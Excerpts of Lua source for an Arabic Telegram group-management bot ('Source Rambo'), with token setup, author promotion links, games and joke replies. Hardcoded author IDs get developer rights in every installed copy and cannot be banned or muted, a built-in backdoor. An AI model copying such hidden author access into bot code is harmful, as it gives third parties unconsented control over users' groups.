...
io.write('\27[0;31m\n ارسل لي توكن البوت الان 𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍 :\na𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍\n التوكن غير صحيح تاكد منه ثم ارسله')
else
...
print('\27[0;35m𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي 𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍 :\na𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍\n\27[0;33;49m')
...
io.write('\27[1;31m 𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍 ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍"
echo "TG IS NOT FIND IN FILES BOT"
echo "𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍 𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍"
exit 1
fi
if [ ! $token ]; then
echo "𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍 𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍"
...
token = sudos.token 
--- start functions 𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍
--------------------------------------------------------------------------------------------------------------
...
sudo_users = {SUDO,1853512398,1754365642,1364212456}   
...
if tonumber(user_id) == tonumber(1853512398) then  
var = true 
elseif tonumber(user_id) == tonumber(1364212456) then
var = true  
elseif tonumber(user_id) == tonumber(1754365642) then
var = true  
...
local UserName = (data.username_ or "So0u_rce_Line")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼《𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼》")  
...
if not DevSoFi(msg) then
local Text = [[
🕊سعر التنصيب علي سورس رامبو 
↯سعر التنصيب العادي 20جنيه فقط
🕊للتواصل اتبع الازرار بالاسفل ⇓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙱𝙴𝙱𝙾🇦🇪',url="t.me/D_V_B_a_h_e_r"}},
{{text = ' 𝙼𝙰𝙽𝙾🇦🇪',url="t.me/Xx_Ma_nO_xX"}},
...
{{text = '🇦🇪المبرمج سوريا  ', url="t.me/Xx_Ma_nO_xX"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = ' 🕊تم ارسال الملصق من 𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍\n - '..Name
...
send(msg.chat_id_, msg.id_,' 🕊 اصدار سورس رامبو{ 3x✴}')
end
...
if text == '𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس رامبو ادخل وتابع الجديد](t.me/So0u_rce_Line)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼》', url="t.me/So0u_rce_Line"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if text == '━┅┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉┉━' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس رامبو ادخل وتابع الجديد](t.me/So0u_rce_Line)
]] 
keyboard = {}  
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/So0u_rce_Line)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
if text == 'بيبو مبرمج السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
↝مطور السورس لو حابب تتواصل معاه
اتبع الزر إلى تحت 𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍↜
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝖇𝖊𝖇𝖔🇦🇪', url="t.me/@D_V_B_a_h_e_r"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 🕊 من أحسن السورسات على التليجرام سورس رامبو 🕊
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "رامبو")
...
send(msg.chat_id_,0," 🕊 الـعـضو  : {["..data.first_name_.."](T.ME/So0u_rce_Line)}\n 🕊 ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " 🕊 عذرا  ⇇{["..data.first_name_.."](T.ME/So0u_rce_Line)}\n 🕊 عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
╭𖤍━┅⟞⟦[᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣](http://t.me/So0u_rce_Line)⟧⟝┉━𖤍╮

 [⟦W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼⟧](http://t.me/So0u_rce_Line)
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ᴰᴱᵛᴱᴸᴼᴾᴱᴿ ₁',url="t.me/D_V_B_a_h_e_r"},{text = 'ᴰᴱᵛᴱᴸᴼᴾᴱᴿ ²', url="t.me/Xx_Ma_nO_xX"}},
{{text = 'ᴰᴱᵛᴱᴸᴼᴾᴱᴿ ³',url="t.me/OSDDR"}},
{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼》',url="t.me/So0u_rce_Line"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
local Text = [[
 𖠪 اهلا بك في سورس رامبو الجمدان 𖠪
 𖠪 عايز بوت بأسعار منسبه وبوت مميز كلمني 𖠪  
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' 𝙱𝙴𝙱𝙾🇦🇪',url="t.me/D_V_B_a_h_e_r"},{text = ' 𝙼𝙰𝙽𝙾🇦🇪', url="t.me/Xx_Ma_nO_xX"}},
{{text = '𝙾𝚂𝙾𝚂🇦🇪',url="t.me/OSDDR"}},
{{text = ' 𝚃𝙾𝙰𝚂𝙺🇦🇪',url="t.me/D_V_B_a_h_e_r116BOT"}}, 
{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼》 ', url="t.me/So0u_rce_Line"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'سوريا'  then
local Text = [[
سوريا مبرمج سورس رامبو للتواصل معه اتبع الزر الاسفل ⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' 𝙼𝙰𝙽𝙾🇦🇪',url="t.me/Xx_Ma_nO_xX"}},
...
if text == 'كساحه'  then
local Text = [[
كساحه مطور سورس رامبو للتواصل معه اتبع الزر الاسفل ⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙾𝚂𝙾𝚂🇦🇪',url="t.me/OSDDR"}},
...
if text == 'بيبو'  then
local Text = [[
بيبو  مبرمج سورس رامبو للتواصل معه اتبع الزر الاسفل ⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙱𝙴𝙱𝙾🇦🇪',url="t.me/D_V_B_a_h_e_r"}},
...
{{text = '🎯رواية "أرض زيكولا"',url="https://t.me/So0u_rce_Line"}},
{{text = '🎯موسوعة الظلام رعب وما شابه ذلك', url="https://t.me/barfrends/263376"}},
{{text = '🎯رواية "الشفق الجزء الأول"', url="https://t.me/So0u_rce_Line"}},
{{text = '🎯رواية "المخلوق', url="https://t.me/So0u_rce_Line"}},
{{text = '🎯رواية "بعد النسيان"', url="https://t.me/t.me/So0u_rce_Line"}},
{{text = '🎯كتاب في حضرة الجن', url="https://t.me/https://t.me/t.me/So0u_rce_Line"}},
{{text = '🎯رواية "واختفى كل شئ"', url="https://t.me/t.me/So0u_rce_Line"}},
{{text = '🎯رواية "نيلوفر أسود"', url="https://t.me/t.me/So0u_rce_Line"}},
{{text = '🎯رواية"جثة في الفندق"', url="https://t.me/t.me/So0u_rce_Line"}},
{{text = '🎯رواية "في القطار السريع"', url="https://t.me/t.me/So0u_rce_Line"}},
{{text = '🎯لقاء مع كاتب رعب"', url="https://t.me/t.me/So0u_rce_Line"}},
{{text = '🎯رواية"الإنسان الأخير""', url="https://t.me/t.me/So0u_rce_Line"}},
{{text = '🎯رواية" مقبرة الحيوانات""', url="https://t.me/So0u_rce_Line"}},
{{text = '𝙱𝙴𝙱𝙾🇦🇪',url="t.me/D_V_B_a_h_e_r"}},
{{text = ' 𝙼𝙰𝙽𝙾🇦🇪',url="t.me/Xx_Ma_nO_xX"}},
{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼》 ', url="t.me/So0u_rce_Line"}},
}
...
local Text = [[
مطورين ومبرمجين سورس رامبو اتبع الازرار للتواصل معهم ⬇️🧿
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'بيبو مبرمج السورس',url="t.me/D_V_B_a_h_e_r"}},
{{text = 'سوريا مبرمج السورس',url="t.me/Xx_Ma_nO_xX"}},
{{text = 'كساحه مطور السورس',url="t.me/OSDDR"}},
}
local msg_id = msg.id_/2097152/0.5
...
if text == '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼》 ' then
local Text = [[ 
 🕊من أحسن السورسات على التليجرام سورس رامبو 🕊
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼》', url="t.me/beboMANOO"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'العاب رامبو' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 🕊 اهلا في قائمه الالعاب المتطوره سورس رامبو 🕊 
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[《⬇️اتبع الازرار للتواصل مع》](t.me/So0u_rce_Line)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
if tonumber(result.sender_user_id_) == tonumber(1754365642) then  
send(msg.chat_id_, msg.id_, "لا يمكنك حظر مبرمج السورس عام ✴")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1854618934) then  
send(msg.chat_id_, msg.id_, "لا يمكنك حظر مبرمج السورس عام ✴")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1853512398) then  
send(msg.chat_id_, msg.id_, "عذرآ لـآ يمكن حظر المبرمج سوريا عام 🚫")
return false 
end
...
if result.id_ == tonumber(1754365642) then
send(msg.chat_id_, msg.id_, " ✴ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1854618934) then
...
if tonumber(userid) == tonumber(1754365642) then  
send(msg.chat_id_, msg.id_, "لا يمكنك حظر مبرمج السورس عام ✴")
return false 
end
...
if tonumber(userid) == tonumber(1854618934) then  
send(msg.chat_id_, msg.id_, "لا يمكنك حظر مبرمج السورس عام ✴")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(1853512398) then  
send(msg.chat_id_, msg.id_, "لا يجوز كتم سوريا عام لانه هكر 🌚😹")
return false 
end
...
t = ' 🕊 ملفات السورس رامبو𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍\n 𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍 \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
send(msg.chat_id_, msg.id_," 🕊 عذرا الملف لايدعم سورس رامبو\n") 
end
return false
end
...
if text == ("مسح قائمه رامبو") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 🕊 تم مسح قائمه رامبو')
return false
end

if text == 'قائمه رامبو' and Sudo(msg) then
...
if text == ("رفع رامبو") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع رامبو@(.*)$") and Sudo(msg) then
local username = text:match("^رفع رامبو@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع رامبو(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع رامبو(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل رامبو") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل رامبو@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل رامبو@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل رامبو(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل رامبو(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
t = "\n 🕊 قائمه زوجات الجروب \n 🕊═───═❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼》 ](t.me/So0u_rce_Line)❳═───═??\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🕊 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'So0u_rce_Line')..')'
...
' }\nء⧬━┅┅┄⟞❲[᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣](t.me/So0u_rce_Line)❳⟝┄┉┉━⧬'..
'\n 🕊  علامة ال {✓} تعني مفعل'..
'\n 🕊  علامة ال {✘} تعني معطل'..
'\nء𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍'..
'\n'..' 🕊  امر صيح  ⇇{ '..kickme..
...
' }\n'..' 🕊  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' 🕊  الرفع  ⇇{ '..setadd..
' }\n'..' 🕊  الحظر  ⇇{ '..banm..' }\n\n 🕊═───═❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼》 ](t.me/So0u_rce_Line)❳═───═ 🕊\n 🕊 قناة سورس رامبو𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍\n [ ❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼》 ](t.me/So0u_rce_Line)❳](t.me/So0u_rce_Line) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍\nاضغط علي الاسم ليتم نسخه\n𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍ٴ\n 🕊 ❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼》 ](t.me/So0u_rce_Line)❳ 🕊 ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'رامبو').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'رامبو')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس رامبوو🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
end --الكود حصري سورس رامبويعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'رامبو').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/So0u_rce_Line)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/So0u_rce_Line)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/So0u_rce_Line)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/So0u_rce_Line)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/So0u_rce_Line)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/So0u_rce_Line)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/So0u_rce_Line)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/So0u_rce_Line)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/So0u_rce_Line)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/So0u_rce_Line)')
return false
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/So0u_rce_Line)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/So0u_rce_Line)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..🕊♥️](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/So0u_rce_Line)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🕊](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..🕊💕](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح ..😹👻](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/So0u_rce_Line)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..🕊💕](t.me/So0u_rce_Line)')
return false
end
end
end
...
keyboard.inline_keyboard = {
{
{text="تأكيد الامر",callback_data="Ok"..msg.sender_user_id_},{text="الغاء الامر",callback_data="noKikedMe"..msg.sender_user_id_},
},
}
...
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=msg.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then p
send(msg.chat_id_, msg.id_,' 🕊 ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if (data and data.code_ and data.code_ == 3) then 
...
[[
🌨𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍Use ⇨ #username 🌨
🌨𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍iD ⇨ #id 🌨
🌨𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍Sta ⇨  #stast 🌨
🌨𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍Msg ⇨ #msgs 🌨
🌨𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍NaMe ⇨ #name  🌨
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
...
[[
↑𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username 🕊  
↑𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍𝙄𝘿 ➱ #id
↑𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍𝙍𝘼𝙉𝙆 ➱  #stast 🕊  
↑𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍𝙈𝘼𝙎𝙂 ➱ #msgs 🕊  
↑𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍𝗖𝗛 ➯  ↝@So0u_rce_Line↜ 🕊  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
?? 𝟔 𖡻 #msgs  ࿇🦄
...
[🎯ألعاب سورس رامبو الاحسن في التليجرام .↑]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [《𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼》 ](t.me/So0u_rce_Line)
]]
keyboard = {} 
...
local Text = [[
 ...
 تحت لي في الزر الأسفل𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍
 اختر الامر الذي تريدها .↑𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍
ده من الازرار بلاسفل . 𖤍━┅┄⟞⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧⟝┄┉━𖤍
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼》 ](t.me/So0u_rce_Line)❳ 
]]
keyboard = {} 
...
if Text == '/add' then
local Teext =[[
🎮 اهلا بك في قسم الالعاب ..↑⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧
🕹 اختر العبه الذي تريدفي الاسفل ..↑⟦᪣𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼᪣⟧
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼》 ](t.me/So0u_rce_Line)❳ 
]]
keyboard = {} 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'رامبو')
